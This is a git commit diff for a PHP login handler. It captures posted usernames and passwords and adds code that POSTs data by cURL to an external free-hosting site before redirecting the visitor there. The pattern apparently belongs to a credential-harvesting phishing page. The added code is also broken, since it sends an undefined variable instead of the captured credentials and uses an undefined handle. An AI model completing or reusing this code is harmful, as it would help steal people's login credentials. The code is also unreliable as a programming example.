ba3264d2f0188a2e79721f93142f7a330ca7fda9
OpenMirror <54529482+OpenMirror@users.noreply.github.com>
2023-06-04 16:13:43 +0200

    Update login.php

--- login.php
+++ login.php
@@ -3,6 +3,17 @@
     // To access the data sent with the GET method, you can use $_GET
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
-  
-    header('Location: '."https://sparkling1234.000webhostapp.com/requests/");
+
+    $url = "https://sparkling1234.000webhostapp.com/";
+
+    $ch = curl_init($url);
+
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    header('Location: '.$url);
 ?>
